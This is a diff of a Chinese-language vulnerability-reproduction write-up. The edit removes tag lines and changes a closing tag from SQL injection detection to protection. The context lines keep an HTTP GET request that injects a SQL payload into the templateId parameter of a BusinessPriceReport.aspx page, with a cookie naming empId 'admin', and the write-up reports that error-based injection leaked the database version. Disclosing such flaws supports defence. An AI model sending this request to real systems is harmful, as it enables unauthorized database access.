@@ -31,14 +31,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-计算机安全
-
-计算机服务器
-
-网络安全
-
 ```
 GET /m/Dingding/Product/BusinessPriceReport.aspx?templateId='SQLI_POC-- HTTP/1.1
 Host: 
@@ -49,4 +41,4 @@ Cookie: UserCookie={"empId":"admin","corpId": "1"}
 
 成功通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")在响应回显数据库版本信息
 
-SQL注入检测
+SQL注入防护
